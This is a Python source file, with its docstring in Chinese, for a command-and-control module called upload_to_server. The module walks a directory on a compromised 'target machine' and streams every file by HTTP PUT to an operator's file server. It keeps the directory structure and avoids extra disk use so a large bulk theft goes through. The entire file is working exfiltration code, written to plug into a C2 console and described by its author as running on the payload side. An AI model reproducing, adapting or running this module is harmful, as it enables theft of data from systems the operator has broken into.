"""upload_to_server — 目录碎片文件逐个回传 file_server(不打压缩包,保持目录结构)。

场景: 目标机某目录碎片文件极多, 打 tar 需两倍磁盘空间放不下——本模块
逐个 HTTP PUT 直传 file_server, 磁盘零额外占用, 目录结构原样保留。

用法(console 或 C2 页面模块执行):
  upload_to_server <server_ip> <server_port> <本地目录> [远程根路径]

- remote_root 默认 "/": 文件落在 file_server 启动目录的相对路径;
  指定如 "/data" 则统一挂到该前缀下
- 失败文件: 记录计数继续传下一个(不中断); 失败明细由 file_server
  端 stderr 打印([fs3] FAIL 行), 载荷端只返回统计, 不列明细
- 空目录 / symlink / 非普通文件跳过(目录结构由文件路径承载)
- 流式传输: 每个文件独立 HTTP 连接, 不整读进内存; 不占 C2 任务队列
"""

import os

MODULE = {
    "desc": "目录碎片文件逐个回传 file_server(不打压缩包,保持目录结构)",
    "params": [("server_ip", "必填；file_server 地址"),
               ("server_port", "必填；file_server 端口"),
               ("local_dir", "必填；本地目录路径"),
               ("remote_root", "可选；远程根路径,默认 /")],
}

_CHUNK = 65536


def _put(ip, port, path, fp):
    """单文件 HTTP PUT(流式 body + Content-Length)。返回 True=成功。"""
    import http.client
    import urllib.parse as _up
    size = os.path.getsize(fp)
    url = _up.quote(path, safe="/")
    conn = http.client.HTTPConnection(ip, int(port), timeout=60)
    try:
        with open(fp, "rb") as f:
            conn.request("PUT", url, body=f,
                         headers={"Content-Length": str(size)})
        r = conn.getresponse()
        r.read()  # 排空响应体(HTTP/1.1 连接复用)
        return r.status in (200, 201)
    finally:
        conn.close()


def run(server_ip, server_port, local_dir, remote_root="/"):
    root = os.path.abspath(local_dir)
    if not os.path.isdir(root):
        return f"(upload_to_server: 目录不存在: {local_dir})"
    rroot = str(remote_root or "/")
    if not rroot.startswith("/"):
        rroot = "/" + rroot
    rroot = rroot.rstrip("/")

    total = ok = failed = 0
    total_bytes = 0
    for dirpath, _dirnames, filenames in os.walk(root):
        for name in filenames:
            fp = os.path.join(dirpath, name)
            # symlink/设备等非普通文件跳过(isfile 跟随链接,须先判 islink)
            if os.path.islink(fp) or not os.path.isfile(fp):
                continue
            rel = os.path.relpath(fp, root).replace(os.sep, "/")
            path = f"{rroot}/{rel}"
            total += 1
            try:
                if _put(server_ip, server_port, path, fp):
                    ok += 1
                    total_bytes += os.path.getsize(fp)
                else:
                    failed += 1
            except Exception:
                failed += 1
    return (f"(upload_to_server: 完成 {ok}/{total} 个文件, "
            f"{total_bytes} 字节; 失败 {failed} 个——失败明细见 "
            f"file_server 端 stderr [fs3] FAIL 行)")


if __name__ == "__main__":
    print("usage: upload_to_server <server_ip> <server_port> "
          "<local_dir> [remote_root]")
